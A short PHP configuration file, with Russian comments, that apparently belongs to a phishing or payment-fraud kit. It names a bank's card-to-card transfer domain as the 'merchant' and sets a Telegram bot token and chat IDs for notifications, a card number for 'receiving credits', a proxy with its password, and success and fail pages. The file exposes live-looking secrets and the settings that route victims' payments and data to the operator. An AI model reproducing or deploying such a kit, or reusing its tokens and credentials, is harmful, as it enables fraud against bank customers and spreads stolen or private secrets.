<?php

global $token, $chatid, $card, $success_url, $fail_url;
header('Content-Type: text/html; charset=utf-8');

//
$proxy = '95.182.126.4:1050';
$pass = 'Wa3kgt:lJnXgbb4ZR';


// Название торговой точки
$name  = 'p2p.ubrr.ru';

// Токен бота и id чата для уведомлений
$token  = '910217880:AAGHbsvy4VaKtSP9CmSeIUU-E4OTz-iE1Jk';
$chatid = '647222952';

$wtoken  = '910217880:AAGHbsvy4VaKtSP9CmSeIUU-E4OTz-iE1Jk';
$wchatid = '-1001382608695';

// Номер карты для поступления зачислений с пробелами
$card = '5336690185335348';

// Страница с успешной оплатой
$success_url = 'success.php';


// Страница с ошибкой оплаты
$fail_url = 'fail.php';

?>